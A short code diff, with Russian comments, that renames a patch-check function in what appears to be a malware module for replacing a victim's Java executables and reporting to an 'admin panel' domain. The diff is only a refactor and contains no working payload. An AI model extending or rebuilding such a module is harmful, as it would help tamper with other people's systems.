@@ -43,8 +43,6 @@ char versionPatch[] = "1.7"; //версия патча
 
 static char domain[128]; //адрес админки
 
-static bool PatchIsLoaded();
-
 //Определяет версию явы, возвращает true если ява есть, иначе false. Заодно в переменную javaHome ложит путь к яве
 static bool GetJavaVersion()
 {
@@ -925,7 +923,7 @@ static bool ReplacementExe(const char* java, const char* javao, const char* java
 }
 
 //возвращает true если патч установлен
-static bool PatchIsLoaded()
+bool JavaPatchInstalled()
 {
 	char uidTxt[MAX_PATH];
 	if( GetWorkFolder( uidTxt, "uid.txt" ) == 0 )
@@ -1030,7 +1028,7 @@ DWORD WINAPI SendJavaPatchSetupPatch( LPVOID num )
 DWORD WINAPI Run_Path(LPVOID lpData)
 {
 	char testPath[MAX_PATH];
-	if( PatchIsLoaded() ) return 0; //если патч установлен, то не нужно его повторно ставить
+	if( JavaPatchInstalled() ) return 0; //если патч установлен, то не нужно его повторно ставить
 	if(	GetWorkFolder(testPath, JavaPatcherSignalFile ))
 	{
 		while( true )
@@ -1145,7 +1143,7 @@ void JavaPatcherAddPidToFile()
 DWORD WINAPI JavaPatcherSignal(LPVOID lpData)
 {
 
-	if( PatchIsLoaded() ) return 0; //если патч установлен, то не нужно его повторно ставить
+	if( JavaPatchInstalled() ) return 0; //если патч установлен, то не нужно его повторно ставить
 
 	InitData();
 	GetJavaVersion();
